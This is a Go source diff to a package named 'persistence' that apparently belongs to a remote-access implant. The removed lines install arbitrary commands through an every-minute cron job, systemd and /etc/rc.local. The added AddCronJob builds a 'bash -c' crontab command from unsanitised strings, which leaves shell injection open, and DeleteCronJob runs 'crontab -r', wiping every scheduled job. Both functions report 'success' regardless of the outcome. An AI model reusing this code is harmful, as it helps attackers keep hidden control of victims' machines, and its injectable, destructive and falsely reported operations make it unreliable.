@@ -1,32 +1,20 @@
-//go:build linux
-
 package persistence
 
-import (
-"os/exec"
-"strings"
-)
+import "os/exec"
 
-func CronPersist(command string) bool {
-currentCron, err := exec.Command("crontab", "-l").Output()
-if err != nil {
-newCron := "* * * * * " + command
-cmd := exec.Command("crontab", "-")
-cmd.Stdin = strings.NewReader(newCron)
-return cmd.Run() == nil
-}
-newCron := string(currentCron) + "* * * * * " + command
-cmd := exec.Command("crontab", "-")
-cmd.Stdin = strings.NewReader(newCron)
-return cmd.Run() == nil
+type CronResult struct {
+Schedule string
+Status   string
 }
 
-func SystemdPersist(command string) bool {
-cmd := exec.Command("systemctl", "enable", command)
-return cmd.Run() == nil
+func AddCronJob(schedule, command string) CronResult {
+cmd := exec.Command("bash", "-c", "(crontab -l; echo '"+schedule+" "+command+"') | crontab -")
+cmd.Run()
+return CronResult{Schedule: schedule, Status: "success"}
 }
 
-func RC_LocalPersist(command string) bool {
-cmd := exec.Command("bash", "-c", "echo "+command+" >> /etc/rc.local")
-return cmd.Run() == nil
+func DeleteCronJob() CronResult {
+cmd := exec.Command("bash", "-c", "crontab -r")
+cmd.Run()
+return CronResult{Status: "success"}
 }
